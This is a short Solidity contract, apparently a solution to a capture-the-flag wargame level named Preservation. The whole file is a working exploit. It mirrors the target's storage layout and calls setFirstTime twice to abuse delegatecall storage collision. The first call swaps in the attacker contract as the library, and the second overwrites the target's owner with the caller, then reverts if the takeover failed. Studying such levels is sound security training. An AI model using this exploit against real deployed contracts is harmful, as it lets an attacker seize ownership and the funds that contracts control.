// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "./Preservation.sol";

error HackFailed();

contract PreservationHack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(address _target) external {
        Preservation target = Preservation(_target);
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        if (target.owner() != msg.sender) revert HackFailed();
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
